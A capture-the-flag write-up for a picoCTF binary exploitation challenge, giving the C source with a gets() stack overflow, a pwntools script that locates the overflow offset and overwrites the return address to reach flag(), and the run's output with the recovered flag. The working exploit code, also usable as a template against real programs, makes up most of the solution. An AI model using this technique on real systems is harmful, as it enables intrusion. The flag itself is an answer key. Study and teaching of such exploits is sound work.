# NewOverFlow-1
Binary Exploitation, 250 points

## Description:
> Okay now lets try mainpulating arguments.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```


## Solution:

(Initial commit with just the script)

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Welcome to 64-bit. Can you match these numbers?", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()
log.info("flag() address: {}".format(hex(exe.symbols["flag"])))

io = start()
payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

payload = fit({overflow_offset: exe.symbols["flag"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-2# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.mmIN0FCE1u'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-2/vuln': pid 1225
[*] Process '/media/sf_CTFs/pico/NewOverFlow-2/vuln' stopped with exit code -11 (SIGSEGV) (pid 1225)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-2/core.1225'
    Arch:      amd64-64-little
    RIP:       0x4008cd
    RSP:       0x7fff65080078
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-2/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] flag() address: 0x40084d
[+] Starting remote process '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e/vuln' on 2019shell1.picoctf.com:
 pid 3871758
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  ce 08 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  4d 08 40 00  00 00 00 00  │BBBB│BBBB│M·@·│····│
    00000050
[+] Receiving all data: Done (39B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3871758)

picoCTF{r0p_1t_d0nT_st0p_1t_df73a1da}
```